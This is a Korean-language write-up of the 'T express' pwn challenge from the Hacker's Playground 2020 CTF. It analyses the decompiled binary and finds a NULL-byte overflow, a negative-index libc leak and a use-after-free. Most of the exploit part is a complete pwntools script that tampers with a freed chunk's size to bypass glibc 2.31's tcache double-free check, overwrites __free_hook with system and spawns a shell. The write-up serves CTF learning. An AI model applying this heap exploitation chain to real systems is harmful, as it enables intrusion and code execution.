# [WriteUp]Hacker's Playground 2020 - T express

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Analysis

### mitigation

![image](https://user-images.githubusercontent.com/59759771/90494464-7e574980-e17e-11ea-82fb-6b1c1648959b.png)

<br>

### main()

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int choice; // eax

  init();
  welcome();
  puts("Welcome to Everland!");
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = read_l();
      if ( choice != 2 )
        break;
      view_ticket();
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        use_ticket();
      }
      else if ( choice == 4 )
      {
        exit(0);
      }
    }
    else if ( choice == 1 )
    {
      buy_ticket();
    }
  }
}
```

반복해서 4가지 메뉴 중 하나를 선택할 수 있다.

<br>

### read_l()

```c
unsigned int __cdecl read_l()
{
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  if ( read(0, buf, 0xFuLL) <= 0 )
  {
    puts("read error");
    exit(0);
  }
  return strtoul(buf, 0LL, 0);
}
```

문자열을 입력받아서 `strtoul()`로 정수로 변환해서 반환하는 함수이다.

<br>

### read_str()

```c
void __cdecl read_str(char *buf, unsigned int size)
{
  ssize_t len; // [rsp+18h] [rbp-8h]

  len = read(0, buf, size);
  if ( len <= 0 )
  {
    puts("read error");
    exit(0);
  }
  if ( buf[len - 1] == '\n' )
    buf[len - 1] = 0;
  else
    buf[len] = 0;
}
```

버퍼의 주소와 길이를 인자로 받아서 문자열을 입력받는데, 마지막에 개행 문자를 제거하는 부분에서 **NULL byte overflow**가 발생한다. 개행 문자가 있을 때는 문제없이 0으로 바꿔 주는데, 개행이 없으면 문자열 끝이 아니라 그 다음 바이트를 0으로 바꿔 버린다.

<br>

### buy_ticket()

```c
void __cdecl buy_ticket()
{
  int choice; // [rsp+4h] [rbp-Ch]
  pass5 **p; // [rsp+8h] [rbp-8h]

  for ( p = passes; *p; ++p )
    ;
  if ( (char *)p - (char *)passes <= 0x30 )
  {
    while ( 1 )
    {
      puts("Which do you want buy?");
      puts("1. One ride ticket");
      puts("2. One day ticket (3 meals, 1 safari pass, unlimited rides, 1 giftshop coupon)");
      printf("(1/2): ");
      choice = read_l();
      if ( choice == 1 )
      {
        *p = (pass5 *)malloc(0x18uLL);
        (*p)->ticket_type = 1LL;
        goto LABEL_11;
      }
      if ( choice == 2 )
        break;
      puts("No such ticket!");
    }
    *p = (pass5 *)malloc(0x30uLL);
    (*p)->ticket_type = 0LL;
    (*p)->meal_ticket = 3;
    (*p)->safari_pass = 1;
    (*p)->giftshop_coupon = 1;
    (*p)->ride_count = 0LL;
LABEL_11:
    printf("First name: ");
    read_str((*p)->firstname, 8u);
    printf("Last name: ");
    read_str((*p)->lastname, 8u);
  }
  else
  {
    puts("Sold out!");
  }
}
```

![image](https://user-images.githubusercontent.com/59759771/90592578-de063100-e220-11ea-9ffb-0784c1bca1bf.png)

`pass5` 구조체는 티켓의 정보를 나타내고, 전역 변수 `passes`에는 구매한 티켓, 즉 할당된 청크들의 주소가 저장되어 있다. 티켓은 최대 7개까지 구매할 수 있다. 티켓의 종류는 one ride ticket과 one day ticket으로 2가지가 있다. one ride ticket을 구매하면 `malloc(0x18)`을 실행하고, one day ticket을 구매하면 `malloc(0x30)`을 실행한다. 그리고 `firstname`과 `lastname`을 입력하고 끝난다.

이 함수에서 핵심은 `ticket_type`을 설정하는 부분이다. one ride ticket일 경우 `ticket_type`은 1이 되고, one day ticket일 경우 0이 된다. 그런데 `ticket_type`이 `lastname`의 바로 뒤에 붙어 있어서, 앞에서 언급한 `readstr()`에서 발생하는 NULL byte overflow의 영향을 받는다. 즉, one day ticket을 구매해도 `ticket_type`을 임의로 0으로 설정할 수 있다.

<br>

### view_ticket()

```c
void __cdecl view_ticket()
{
  int index; // [rsp+Ch] [rbp-4h]

  printf("Index of ticket: ");
  index = read_l();
  if ( index <= 6 && passes[index] )
  {
    puts("==========================");
    printf("|name |%8s %8s |\n", passes[index]->firstname, passes[index]->lastname);
    if ( passes[index]->ticket_type )
    {
      puts("| One ride ticket        |");
    }
    else
    {
      puts("--------------------------");
      printf("|meals|%5u|safari|%5u|\n", passes[index]->meal_ticket, passes[index]->safari_pass);
      printf("|gift |%5u| ride |%5llu|\n", passes[index]->giftshop_coupon, passes[index]->ride_count);
    }
    puts("==========================");
  }
  else
  {
    puts("No such ticket!");
  }
}
```

티켓의 정보를 출력하는 함수이다. `passes`의 주소에 `index`만큼 더해서 청크에 접근한다. 그런데 `index`가 `int`형 변수로 선언되어 있어서, `index <= 6`을 비교할 때 `index`가 음수여도 문제없이 통과한다.

<br>

![image](https://user-images.githubusercontent.com/59759771/90588981-edcd4780-e217-11ea-83b6-7272c24c053d.png)

`index`에 음수를 넣을 경우 `passes`의 앞쪽에 있는 표준 입출력 버퍼에 접근할 수 있다.

<br>

![image](https://user-images.githubusercontent.com/59759771/90589031-0dfd0680-e218-11ea-9a34-84ebe9a9c47d.png)

`stderr`에 접근하면 이런 값들이 저장되어 있어서 libc leak이 가능하다.

<br>

### use_ticket()

```c
void __cdecl use_ticket()
{
  unsigned int choice; // eax
  unsigned int index; // [rsp+4h] [rbp-Ch]
  pass5 *p; // [rsp+8h] [rbp-8h]

  printf("Index of ticket: ");
  index = read_l();
  if ( index <= 6 && passes[index] )
  {
    p = passes[index];
    if ( p->ticket_type )
      goto LABEL_22;
    puts("1) meal 2) safari 3) gift 4) ride");
    printf("(1/2/3/4): ");
    choice = read_l();
    if ( choice == 2 )
    {
      if ( p->safari_pass )
        --p->safari_pass;
    }
    else if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        if ( p->giftshop_coupon )
          --p->giftshop_coupon;
      }
      else if ( choice == 4 )
      {
        ++p->ride_count;
      }
    }
    else if ( choice == 1 && p->meal_ticket )
    {
      --p->meal_ticket;
    }
    if ( !p->meal_ticket && !p->safari_pass && !p->giftshop_coupon )
LABEL_22:
      free(p);
    puts("Thank you. Have a good time!");
  }
  else
  {
    puts("Wrong ticket!");
  }
}
```

구매한 티켓을 사용하는 함수이다. `passes`의 주소에 `index`를 더해서 청크에 접근한다. 티켓이 one ride ticket인지 one day ticket인지에 따라서 동작이 다른데, 이때 `ticket_type`을 보고 어떤 티켓인지 식별한다. one ride ticket인 경우 사용하면 청크가 바로 해제된다. one day ticket인 경우 네 가지의 서비스를 이용할 수 있는데, ride는 무제한이고, 나머지 세 가지의 서비스를 제한 횟수만큼 모두 이용했을 경우(구조체에서 세 변수의 값이 모두 0인 경우) 청크가 해제된다. 그런데 청크를 해제시킨 후에 `passes`에 저장되어 있는 포인터를 제거하지 않아서 UAF나 double free bug가 발생할 가능성이 있다.

<br>

`buy_ticket()`에서 one ride ticket의 `lastname`에 개행 없이 8글자를 입력하면 NULL byte overflow가 발생하여 `ticket_type`을 0으로 조작할 수 있다는 것을 확인했다. 그러면 one day ticket처럼 작동하여 구조체의 다른 필드들에 접근할 수 있다. one ride ticket은 `malloc(0x18)`로 할당하고, 구조체의 크기는 `0x30`이기 때문에 구조체가 다음 청크까지 넘어가게 된다. 이 경우 구조체의 범위는 다음과 같다.

![image](https://user-images.githubusercontent.com/59759771/90592484-a4cdc100-e220-11ea-9109-12783efa05e4.png)

이러면 다음 청크의 size와 fd, bk 필드에 접근할 수 있게 된다. size 필드는 구조체에서 위치상으로 `meal_ticket`에 해당하기 때문에 `use_ticket()`에서 1씩 줄일 수 있고, fd와 bk는 `ride_count`에 해당하기 때문에 1씩 늘릴 수 있다.

<br>

### heap vulnerability

이 문제에서 주어진 libc 파일은 glibc-2.31 버전이다. Double free bug를 방지하기 위한 보안 검사가 들어 있는 버전의 티캐시를 사용한다. Double free check를 하는 코드를 살펴보자.

> https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c

```c
for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
    if (tmp == e)
        malloc_printerr ("free(): double free detected in tcache 2");
```

티캐시 내에서 반복문을 돌면서 해제하려는 청크가 티캐시에 이미 있는지 검사한다. 하지만 이 검사에도 문제점이 있는데, 같은 크기의 티캐시 내에서만 검사한다는 것이다. 앞에서 청크의 사이즈를 임의로 줄일 수 있다는 것을 확인했기 때문에, 먼저 one day ticket을 사용해서 `0x40`바이트 청크를 해제시키고, 청크의 사이즈를 `0x20`바이트로 줄여서 한 번 더 해제시키면 **double free bug**를 발생시킬 수 있다. 이후에 두 청크 중 하나를 다시 할당받아서 `firstname`과 `lastname`을 입력하면 나머지 하나의 청크(사실은 같은 청크이지만)의 fd와 bk를 원하는 값으로 조작할 수 있다. 그러면 원하는 위치에 fake chunk를 할당받을 수 있고, arbitrary write가 가능하게 된다.

<br>

---

## Exploit

```python
# exploit_t_express.py

from pwn import *
# context.log_level = 'debug'

r = process("./t_express")
# r = remote("t-express.sstf.site", 1337)

def buy(choice, firstname, lastname):
    r.recvuntil("choice: ")
    r.sendline("1")

    r.recvuntil("(1/2): ")
    r.sendline(str(choice))

    r.recvuntil("First name: ")
    r.send(firstname)

    r.recvuntil("Last name: ")
    r.send(lastname)

def view(index):
    r.recvuntil("choice: ")
    r.sendline("2")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

def use_oneride(index):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

def use_oneday(index, choice):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

    r.recvuntil("(1/2/3/4): ")
    r.sendline(str(choice))
```

<br>

### libc leak

`view_ticket()`의 `index`에 -4를 넣어서 `stderr`을 leak한다.

```python
# libc leak
view(-4)
r.recvuntil("|name |")
libc = u64(r.recvline()[-9:-3].ljust(8, b"\x00")) - 0x1ec643 # libc base
log.info("libc base: " + hex(libc))
```

![image](https://user-images.githubusercontent.com/59759771/90601708-9210b780-e233-11ea-97d4-2ecd33772252.png)

<br>

### double free

다음의 순서대로 진행한다.

1. one ride ticket 구매(index: 0) - `lastname`에 개행 없이 8글자를 입력하여 `ticket_type`을 0으로 조작
2. one day ticket 구매(index: 1)
3. 2에서 구매한 티켓 모두 사용 / 청크 해제
4. 1에서 구매한 티켓에서 `meal_ticket`을 `0x20`번 사용하여 해제된 청크의 사이즈를 `0x20`으로 조작
5. double free

```python
# double free
buy(1, "AAAAAAAA", "BBBBBBBB") # index: 0
buy(2, "A", "B") # index: 1

use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 2)
use_oneday(1, 3)

for i in range(0x20):
    use_oneday(0, 1)
use_oneday(1, 1)
```

![image](https://user-images.githubusercontent.com/59759771/90604128-57a91980-e237-11ea-9720-648dc450f1c1.png)

<br>

### get shell

free hook을 `system()`의 주소로 덮고, `"/bin/sh"`가 저장된 청크를 free시키면 쉘을 획득할 수 있다. double free된 청크들 중에서 `0x40`바이트 청크를 먼저 할당받아서 `firstname`에 free hook의 주소를 쓰고 `0x20`바이트 청크를 두 번 더 할당받으면 free hook이 fake chunk로 반환될 것이다. 

이때 주의할 점이, 청크의 fd를 조작한다고 하더라도 티캐시에 청크가 들어 있지 않으면 티캐시에서 청크를 반환하지 않는다는 점이다. `tcache_entry[0](1)`에서 괄호 안의 1이 티캐시에 들어 있는 청크의 개수를 뜻하는데, double free된 청크가 반환되고 나면 0이 되어 그 다음부터는 무조건 청크를 새로 할당하게 된다. 이런 문제를 방지하려면 간단하게 먼저 청크 하나를 티캐시에 넣어 놓고 나서 double free시키면 된다.

<br>

---

## Full exploit

```python
# exploit_t_express.py

from pwn import *
# context.log_level = 'debug'

# r = process("./t_express")
r = remote("t-express.sstf.site", 1337)

def buy(choice, firstname, lastname):
    r.recvuntil("choice: ")
    r.sendline("1")

    r.recvuntil("(1/2): ")
    r.sendline(str(choice))

    r.recvuntil("First name: ")
    r.send(firstname)

    r.recvuntil("Last name: ")
    r.send(lastname)

def view(index):
    r.recvuntil("choice: ")
    r.sendline("2")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

def use_oneride(index):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

def use_oneday(index, choice):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

    r.recvuntil("(1/2/3/4): ")
    r.sendline(str(choice))

offset_freehook = 0x1eeb28
offset_system = 0x55410

buy(1, "AAAAAAAA", "BBBBBBBB") # index: 0
buy(2, "A", "B") # index: 1
buy(1, "A", "B") # index: 2

use_oneride(2)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 2)
use_oneday(1, 3)

# libc leak
view(-4)
r.recvuntil("|name |")
libc = u64(r.recvline()[-9:-3].ljust(8, b"\x00")) - 0x1ec643 # libc base
log.info("libc base: " + hex(libc))
freehook = libc + offset_freehook
system = libc + offset_system

# double free
for i in range(0x20):
    use_oneday(0, 1)
use_oneday(1, 1)

# get shell
buy(2, p64(freehook), "B") # index: 3
buy(1, "/bin/sh", "B") # index: 4
buy(1, p64(system), "B") # index: 5

r.recvuntil("choice: ")
r.sendline("3")

r.recvuntil("Index of ticket: ")
r.sendline("4")

r.interactive()
```

![image](https://user-images.githubusercontent.com/59759771/90625038-edeb3880-e253-11ea-9b05-21d01c1439fc.png)